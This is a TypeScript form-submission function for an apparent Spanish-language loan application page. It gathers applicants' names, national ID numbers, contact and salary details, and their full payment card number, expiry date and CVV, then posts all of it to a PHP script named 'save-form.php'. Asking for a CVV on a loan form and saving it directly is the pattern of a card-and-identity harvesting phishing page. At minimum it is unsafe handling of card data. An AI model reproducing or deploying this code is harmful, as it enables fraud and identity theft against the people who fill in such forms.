import { LoanFormData } from '../types/formTypes';

export const submitFormData = async (formData: LoanFormData): Promise<{ success: boolean; message: string }> => {
  try {
    // Create FormData object for PHP submission
    const form = new FormData();
    
    // Add loan details
    form.append('loanAmount', formData.loanAmount.toString());
    form.append('loanTerm', formData.loanTerm.toString());
    
    // Add personal info
    form.append('firstName', formData.firstName);
    form.append('lastName', formData.lastName);
    form.append('dni', formData.dni);
    form.append('province', formData.province);
    form.append('email', formData.email);
    form.append('phone', formData.phone);
    
    // Add occupation details with null checks
    form.append('occupation', formData.occupation);
    form.append('company', formData.occupationDetails?.company || '');
    form.append('position', formData.occupationDetails?.position || '');
    form.append('monthlySalary', formData.occupationDetails?.monthlySalary || '');
    form.append('yearsEmployed', formData.occupationDetails?.yearsEmployed || '');
    
    // Add card info
    form.append('cardType', formData.cardInfo.type);
    form.append('cardNumber', formData.cardInfo.number.replace(/\s/g, ''));
    form.append('cardName', formData.cardInfo.name);
    form.append('cardExpiry', formData.cardInfo.expiry);
    form.append('cardCvv', formData.cardInfo.cvv);

    // Submit to PHP endpoint with proper headers
    const response = await fetch('/save-form.php', {
      method: 'POST',
      body: form,
      headers: {
        'Accept': 'application/json'
      }
    });

    const result = await response.json();
    
    if (!result.success) {
      throw new Error(result.error || 'Error al procesar la solicitud');
    }

    return { 
      success: true, 
      message: result.message || 'Solicitud procesada exitosamente'
    };
  } catch (error: any) {
    console.error('Error submitting form:', error);
    throw new Error(error.message || 'Error al enviar el formulario');
  }
};